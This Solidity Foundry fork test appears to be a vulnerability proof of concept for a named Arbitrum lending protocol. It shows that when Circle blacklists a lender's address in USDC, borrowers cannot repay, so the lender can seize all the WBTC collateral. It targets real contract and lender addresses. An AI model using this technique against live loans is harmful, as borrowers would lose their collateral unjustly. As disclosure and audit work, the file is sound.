// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test, console2} from "forge-std/Test.sol";

/// @notice Fork PoC: a loan-token-blacklisted lender blocks repayLoan(). The borrower
///         is forced into default and the lender takes the full collateral.
/// Run:   ARB_RPC_URL=https://arb1.arbitrum.io/rpc forge test -vv
///
/// Target: Gavel LoanProtocol (Arbitrum One), deployed v1, Sourcify exact match to repo 457fea8.

interface ILoanProtocol {
    struct Loan {
        address borrower;
        address collateralToken;
        uint256 collateralAmount;
        address loanToken;
        uint256 loanAmount;
        uint256 repaymentAmount;
        uint256 maturityTimestamp;
        address lender;
        uint8 status; // 0 ACTIVE, 1 REPAID, 2 DEFAULTED
        uint256 pauseSnapshot;
    }

    function getLoan(uint256 loanId) external view returns (Loan memory);
    function repayLoan(uint256 loanId) external;
    function claimCollateral(uint256 loanId) external;
    function positionNFT() external view returns (address);
    function loanNonce() external view returns (uint256);
    function totalPausedDuration() external view returns (uint256);
    function GRACE_PERIOD() external view returns (uint256);
}

interface IPositionNFT {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getBorrowerTokenId(uint256 loanId) external pure returns (uint256);
    function getLenderTokenId(uint256 loanId) external pure returns (uint256);
}

interface IFiatToken {
    function blacklister() external view returns (address);
    function blacklist(address account) external;
    function isBlacklisted(address account) external view returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract GavelBlacklistRepayDoS is Test {
    ILoanProtocol constant PROTOCOL = ILoanProtocol(0xFCDd6Ef75638D8D19ad634004C234Ad18751fEf2);
    IFiatToken constant USDC = IFiatToken(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    address constant WBTC = 0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f;
    address constant LENDER = 0x763Fc0C034A907f3D73d9Bb35304A608dC98cf77;
    uint256 constant FORK_BLOCK = 512620498;

    IPositionNFT nft;
    uint256 grace;

    function setUp() public {
        // Pinned so the 19-loan state reproduces after loans are repaid or claimed.
        vm.createSelectFork(vm.rpcUrl("arbitrum"), FORK_BLOCK);
        nft = IPositionNFT(PROTOCOL.positionNFT());
        grace = PROTOCOL.GRACE_PERIOD();
    }

    /// Mirrors maturity + GRACE_PERIOD + _pauseElapsed(pauseSnapshot). The protocol is not paused.
    function _deadline(ILoanProtocol.Loan memory l) internal view returns (uint256) {
        return l.maturityTimestamp + grace + (PROTOCOL.totalPausedDuration() - l.pauseSnapshot);
    }

    function _blacklist(address who) internal {
        vm.prank(USDC.blacklister());
        USDC.blacklist(who);
        assertTrue(USDC.isBlacklisted(who), "blacklist failed");
    }

    /// Single loan, end to end, with a control run first.
    function test_blacklistedLender_forcesDefault_loan4() public {
        uint256 loanId = 4;
        ILoanProtocol.Loan memory l = PROTOCOL.getLoan(loanId);
        assertEq(l.status, 0, "loan 4 not ACTIVE on this fork block");
        assertEq(l.loanToken, address(USDC));

        address borrower = nft.ownerOf(nft.getBorrowerTokenId(loanId));
        address lender = nft.ownerOf(nft.getLenderTokenId(loanId));
        IERC20 collat = IERC20(l.collateralToken);

        console2.log("borrower           ", borrower);
        console2.log("lender             ", lender);
        console2.log("collateral (WBTC)  ", l.collateralAmount);
        console2.log("repayment (USDC)   ", l.repaymentAmount);

        // 0. Control: without a blacklist, the borrower can repay.
        uint256 snap = vm.snapshotState();
        deal(address(USDC), borrower, l.repaymentAmount);
        vm.startPrank(borrower);
        USDC.approve(address(PROTOCOL), l.repaymentAmount);
        PROTOCOL.repayLoan(loanId);
        vm.stopPrank();
        assertEq(PROTOCOL.getLoan(loanId).status, 1, "control repay failed");
        vm.revertToState(snap);

        // 1. Circle blacklists the lender-position holder.
        _blacklist(lender);

        // 2. The borrower is funded, has approved, and is inside the window, but still cannot repay.
        deal(address(USDC), borrower, l.repaymentAmount);
        vm.startPrank(borrower);
        USDC.approve(address(PROTOCOL), l.repaymentAmount);
        vm.expectRevert(bytes("Blacklistable: account is blacklisted"));
        PROTOCOL.repayLoan(loanId);

        // The same happens on the last second of the grace period.
        vm.warp(_deadline(l) - 1);
        vm.expectRevert(bytes("Blacklistable: account is blacklisted"));
        PROTOCOL.repayLoan(loanId);
        vm.stopPrank();

        // 3. The grace period ends. The blacklisted lender can still claim, because WBTC has no blacklist.
        vm.warp(_deadline(l));
        uint256 before = collat.balanceOf(lender);
        vm.prank(lender);
        PROTOCOL.claimCollateral(loanId);

        assertEq(collat.balanceOf(lender) - before, l.collateralAmount, "lender did not get collateral");
        assertEq(PROTOCOL.getLoan(loanId).status, 2, "not DEFAULTED");
        assertEq(USDC.balanceOf(borrower), l.repaymentAmount, "borrower still holds the repayment USDC");
        console2.log("lender seized WBTC ", l.collateralAmount);
    }

    /// Every active loan at the fork block: one blacklist call locks out every borrower.
    function test_blacklistedLender_locksAllActiveLoans() public {
        uint256 n = PROTOCOL.loanNonce();
        _blacklist(LENDER);

        uint256 active;
        uint256 blocked;
        uint256 totalCollat;
        uint256 totalOwed;
        uint256 latestDeadline;

        for (uint256 id = 1; id <= n; id++) {
            ILoanProtocol.Loan memory l = PROTOCOL.getLoan(id);
            if (l.borrower == address(0) || l.status != 0) continue;
            active++;
            if (l.loanToken != address(USDC)) continue;
            if (nft.ownerOf(nft.getLenderTokenId(id)) != LENDER) continue;
            if (block.timestamp >= _deadline(l)) continue;

            address borrower = nft.ownerOf(nft.getBorrowerTokenId(id));
            deal(address(USDC), borrower, l.repaymentAmount);
            vm.startPrank(borrower);
            USDC.approve(address(PROTOCOL), l.repaymentAmount);
            (bool ok,) = address(PROTOCOL).call(abi.encodeCall(ILoanProtocol.repayLoan, (id)));
            vm.stopPrank();
            assertFalse(ok, "repay unexpectedly succeeded");

            blocked++;
            totalCollat += l.collateralAmount;
            totalOwed += l.repaymentAmount;
            if (_deadline(l) > latestDeadline) latestDeadline = _deadline(l);
        }

        // After every grace period has ended, the lender claims all of them.
        vm.warp(latestDeadline);
        uint256 before = IERC20(WBTC).balanceOf(LENDER);
        for (uint256 id = 1; id <= n; id++) {
            ILoanProtocol.Loan memory l = PROTOCOL.getLoan(id);
            if (l.borrower == address(0) || l.status != 0) continue;
            if (nft.ownerOf(nft.getLenderTokenId(id)) != LENDER) continue;
            vm.prank(LENDER);
            PROTOCOL.claimCollateral(id);
        }
        uint256 seized = IERC20(WBTC).balanceOf(LENDER) - before;

        console2.log("active loans             ", active);
        console2.log("repayments blocked       ", blocked);
        console2.log("USDC owed (6 dp)         ", totalOwed);
        console2.log("WBTC collateral (8 dp)   ", totalCollat);
        console2.log("WBTC seized by lender    ", seized);
        assertEq(blocked, active, "some active loan was not blocked");
        assertEq(seized, totalCollat);
    }
}
